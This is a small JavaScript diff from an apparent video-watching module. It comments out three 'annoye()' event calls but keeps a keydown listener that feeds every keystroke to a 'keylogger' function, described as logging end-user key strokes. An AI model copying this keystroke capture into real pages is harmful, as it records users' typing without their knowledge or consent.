@@ -184,13 +184,13 @@ export function watch(videoParams) {
    * @description log end-user key strokes
    */
   document.addEventListener("keydown", (event) => {
-    annoye();
+    // annoye();
     keylogger(event, methods);
   });
 }
 document.addEventListener("mousedown", () => {
-  annoye();
+  // annoye();
 });
 document.addEventListener("mouseleave", () => {
-  annoye();
+  // annoye();
 });
